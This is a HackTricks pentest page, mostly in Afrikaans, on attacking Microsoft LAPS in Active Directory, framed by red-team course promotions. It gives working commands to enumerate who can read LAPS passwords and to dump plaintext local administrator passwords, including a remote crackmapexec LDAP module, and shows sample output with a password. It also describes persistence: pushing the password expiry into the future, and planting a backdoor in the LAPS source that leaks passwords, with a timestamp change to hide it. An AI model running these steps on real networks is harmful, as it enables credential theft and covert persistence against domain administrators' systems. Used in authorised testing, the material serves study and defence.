# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Basic Information

Local Administrator Password Solution (LAPS) is 'n hulpmiddel wat gebruik word om 'n stelsel te bestuur waar **administrateur wagwoorde**, wat **uniek, ewekansig, en gereeld verander** word, toegepas word op domein-verbonden rekenaars. Hierdie wagwoorde word veilig binne Active Directory gestoor en is slegs toeganklik vir gebruikers wat toestemming ontvang het deur middel van Toegang Beheer Lyste (ACLs). Die sekuriteit van die wagwoord oordragte van die kliënt na die bediener word verseker deur die gebruik van **Kerberos weergawe 5** en **Gevorderde Versleuteling Standaard (AES)**.

In die domein se rekenaarobjekte, lei die implementering van LAPS tot die toevoeging van twee nuwe eienskappe: **`ms-mcs-AdmPwd`** en **`ms-mcs-AdmPwdExpirationTime`**. Hierdie eienskappe stoor die **plank teks administrateur wagwoord** en **sy vervaldatum**, onderskeidelik.

### Check if activated
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Wagwoord Toegang

Jy kan die **rauwe LAPS-beleid** aflaai van `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` en dan **`Parse-PolFile`** van die [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pakket gebruik om hierdie lêer in 'n menslike leesbare formaat om te skakel.

Boonop kan die **natuurlike LAPS PowerShell cmdlets** gebruik word as hulle op 'n masjien geïnstalleer is waartoe ons toegang het:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** kan ook gebruik word om uit te vind **wie die wagwoord kan lees en dit te lees**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Die [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) fasiliteer die enumerasie van LAPS met verskeie funksies.\
Een is om **`ExtendedRights`** te parse vir **alle rekenaars met LAPS geaktiveer.** Dit sal **groepe** spesifiek **gedelegeer om LAPS wagwoorde te lees**, wat dikwels gebruikers in beskermde groepe is.\
'n **rekening** wat **'n rekenaar** aan 'n domein aangesluit het, ontvang `All Extended Rights` oor daardie gasheer, en hierdie reg gee die **rekening** die vermoë om **wagwoorde** te **lees**. Enumerasie kan 'n gebruikersrekening toon wat die LAPS wagwoord op 'n gasheer kan lees. Dit kan ons help om **spesifieke AD gebruikers** te teiken wat LAPS wagwoorde kan lees.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**
As daar geen toegang tot 'n powershell is nie, kan jy hierdie voorreg op afstand misbruik deur LDAP te gebruik deur
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Dit sal al die wagwoorde wat die gebruiker kan lees, dump, wat jou in staat stel om 'n beter voet aan die grond te kry met 'n ander gebruiker.

## **LAPS Volharding**

### **Vervaldatum**

Sodra jy admin is, is dit moontlik om die **wagwoorde** te **verkry** en 'n masjien te **verhoed** om sy **wagwoord** te **opdateer** deur die vervaldatum in die toekoms te **stel**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Die wagwoord sal steeds teruggestel word as 'n **admin** die **`Reset-AdmPwdPassword`** cmdlet gebruik; of as **Moet nie wagwoordvervaltyd langer as wat deur beleid vereis word toelaat nie** geaktiveer is in die LAPS GPO.
{% endhint %}

### Agterdeur

Die oorspronklike bronkode vir LAPS kan [hier](https://github.com/GreyCorbel/admpwd) gevind word, daarom is dit moontlik om 'n agterdeur in die kode te plaas (binne die `Get-AdmPwdPassword` metode in `Main/AdmPwd.PS/Main.cs` byvoorbeeld) wat op een of ander manier **nuwe wagwoorde sal uitbring of dit êrens sal stoor**.

Dan, compileer net die nuwe `AdmPwd.PS.dll` en laai dit op na die masjien in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (en verander die wysigingstyd).

## Verwysings
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
